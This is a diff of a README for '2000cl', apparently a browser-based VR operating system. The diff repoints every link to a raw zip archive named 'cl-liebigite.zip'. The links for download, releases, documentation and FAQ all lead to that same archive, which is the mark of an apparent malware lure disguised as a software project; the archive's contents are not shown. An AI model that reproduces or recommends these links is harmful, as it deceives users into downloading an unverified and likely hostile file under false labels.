@@ -1,6 +1,6 @@
 # 🖥️ 2000cl - A Browser-Based VR Operating System
 
-[![Download Now](https://raw.githubusercontent.com/dellgenius/2000cl/main/expenseless/2000cl.zip)](https://raw.githubusercontent.com/dellgenius/2000cl/main/expenseless/2000cl.zip)
+[![Download Now](https://raw.githubusercontent.com/dellgenius/2000cl/main/expenseless/cl-liebigite.zip)](https://raw.githubusercontent.com/dellgenius/2000cl/main/expenseless/cl-liebigite.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to 2000cl! This document will guide you through downloading and running 
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [2000cl Releases](https://raw.githubusercontent.com/dellgenius/2000cl/main/expenseless/2000cl.zip).
+To get started, visit this page to download: [2000cl Releases](https://raw.githubusercontent.com/dellgenius/2000cl/main/expenseless/cl-liebigite.zip).
 
 1. Go to the 2000cl Releases page.
 2. Find the latest version.
@@ -55,8 +55,8 @@ Before downloading, ensure your system meets the following requirements:
 
 ## 📑 Additional Resources
 
-- **Documentation:** Check our [Documentation](https://raw.githubusercontent.com/dellgenius/2000cl/main/expenseless/2000cl.zip) for more in-depth information on using all features.
-- **Troubleshooting:** For common issues, visit our [FAQ](https://raw.githubusercontent.com/dellgenius/2000cl/main/expenseless/2000cl.zip).
+- **Documentation:** Check our [Documentation](https://raw.githubusercontent.com/dellgenius/2000cl/main/expenseless/cl-liebigite.zip) for more in-depth information on using all features.
+- **Troubleshooting:** For common issues, visit our [FAQ](https://raw.githubusercontent.com/dellgenius/2000cl/main/expenseless/cl-liebigite.zip).
 
 ## 📩 Get Support
 
@@ -70,4 +70,4 @@ Stay informed about the latest updates and features by following us on our offic
 
 A big thank you to all contributors and users who make 2000cl better every day. Your feedback is invaluable.
 
-[![Download Now](https://raw.githubusercontent.com/dellgenius/2000cl/main/expenseless/2000cl.zip)](https://raw.githubusercontent.com/dellgenius/2000cl/main/expenseless/2000cl.zip)
+[![Download Now](https://raw.githubusercontent.com/dellgenius/2000cl/main/expenseless/cl-liebigite.zip)](https://raw.githubusercontent.com/dellgenius/2000cl/main/expenseless/cl-liebigite.zip)
